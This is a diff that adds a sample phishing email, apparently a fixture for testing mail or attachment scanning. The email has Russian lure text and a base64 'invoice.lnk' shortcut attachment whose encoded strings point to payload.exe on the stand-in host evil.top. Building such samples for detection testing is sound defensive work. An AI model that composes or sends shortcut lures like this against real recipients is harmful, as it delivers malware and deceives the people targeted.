@@ -1,0 +1,23 @@
+From: phish@evil.top
+To: victim@company.local
+Subject: Ярлык во вложении
+Message-ID: <lnk_att@evil.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="L"
+
+--L
+Content-Type: text/plain; charset=utf-8
+
+Откройте ярлык.
+--L
+Content-Type: application/octet-stream; name="invoice.lnk"
+Content-Disposition: attachment; filename="invoice.lnk"
+Content-Transfer-Encoding: base64
+
+TAAAAD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDADoAXABcAHMAdgBjAGgAbwBzAHQALgBl
+AHYAaQBsAC4AdABvAHAAXABwAGEAeQBsAG8AYQBkAC4AZQB4AGUAAAAAaAB0AHQAcABzADoA
+LwAvAGUAdgBpAGwAC4AdABvAHAALwBsAG4AawA=
+
+--L--
